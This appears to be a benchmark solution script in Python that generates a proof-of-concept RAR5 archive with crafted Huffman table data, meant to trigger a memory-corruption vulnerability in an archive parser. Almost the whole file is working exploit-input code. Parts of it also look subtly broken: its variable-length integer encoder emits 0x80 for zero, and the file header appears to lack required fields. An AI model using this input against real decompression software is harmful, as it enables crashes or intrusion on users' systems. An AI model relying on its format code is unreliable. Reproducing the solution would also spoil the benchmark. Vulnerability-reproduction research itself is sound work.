import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def vint(n: int) -> bytes:
            res = bytearray()
            if n == 0:
                return b'\x80'
            while n > 0:
                res.append((n & 0x7f) | 0x80)
                n >>= 7
            res[-1] &= 0x7f
            return bytes(res)

        class BitStream:
            def __init__(self):
                self.bits = []

            def write(self, value: int, num_bits: int):
                for i in range(num_bits):
                    bit = (value >> (num_bits - 1 - i)) & 1
                    self.bits.append(bit)

            def get_bytes(self) -> bytes:
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                b = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte_val = 0
                    for j in range(8):
                        byte_val = (byte_val << 1) | self.bits[i + j]
                    b.append(byte_val)
                return bytes(b)

        # 1. RAR5 Signature
        rar5_signature = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # 2. Main Archive Header
        main_header_payload = vint(0x01) + vint(0) + vint(0)
        main_header_block_data = vint(len(main_header_payload)) + main_header_payload
        main_header_crc = zlib.crc32(main_header_block_data).to_bytes(4, 'little')
        main_archive_header = main_header_crc + main_header_block_data

        # 3. Malicious Compressed Data Stream
        block_flags = 0b11100000
        
        bs = BitStream()

        pre_code_lengths = [0] * 20
        pre_code_lengths[18] = 1 
        pre_code_lengths[1] = 2  
        pre_code_lengths[16] = 2 

        for length in pre_code_lengths:
            bs.write(length, 4)

        num_overflow_ops = 4
        for _ in range(num_overflow_ops):
            bs.write(0, 1)
            bs.write(0x7f, 7)

        huffman_table_data = bs.get_bytes()
        compressed_data = bytes([block_flags]) + huffman_table_data

        # 4. File Header
        file_header_flags = 0x0C
        unpacked_size = 1
        file_attrs = 0x20
        dummy_data_crc = 0
        comp_info = 0x30
        host_os = 2
        file_name = b"poc"

        file_header_data = (
            vint(file_header_flags) +
            vint(unpacked_size) +
            vint(file_attrs) +
            struct.pack('<I', dummy_data_crc) +
            vint(comp_info) +
            vint(host_os) +
            vint(len(file_name)) +
            file_name
        )

        file_header_payload = vint(0x02) + file_header_data
        file_header_block_data = vint(len(file_header_payload)) + file_header_payload
        file_header_crc = zlib.crc32(file_header_block_data).to_bytes(4, 'little')
        full_file_header_block = file_header_crc + file_header_block_data
        
        file_block_in_archive = full_file_header_block + compressed_data

        # 5. End of Archive Header
        end_header_payload = vint(0x05) + vint(0)
        end_header_block_data = vint(len(end_header_payload)) + end_header_payload
        end_header_crc = zlib.crc32(end_header_block_data).to_bytes(4, 'little')
        end_archive_header = end_header_crc + end_header_block_data

        # 6. Assemble the final PoC
        poc = (
            rar5_signature +
            main_archive_header +
            file_block_in_archive +
            end_archive_header
        )
        
        return poc
